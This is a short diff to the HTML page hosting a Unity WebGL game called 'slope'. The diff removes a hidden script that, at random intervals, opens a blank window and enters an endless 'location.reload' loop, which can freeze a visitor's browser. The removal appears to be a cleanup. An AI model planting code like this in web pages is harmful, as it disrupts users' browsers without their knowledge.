@@ -13,25 +13,6 @@
     <script>
         var gameInstance = UnityLoader.instantiate("gameContainer", "Build/slope.json", { onProgress: UnityProgress, Module: { onRuntimeInitialized: function() { UnityProgress(gameInstance, "complete") } } });
     </script>
-    <script>
-            hello()
-
-function hello() {
-  setTimeout(function() {
-    ya()
-    hello()
-  }, 100000);
-}
-
-function ya() {
-    let num = Math.floor(Math.random() * 21);
-    if (num == 7) {
-        window.open("about:blank")
-
-        while(1)location.reload(1)
-    }
-}
-    </script>
 </head>
 <body style="margin: 0; overflow: hidden;">
     <div class="webgl-content">
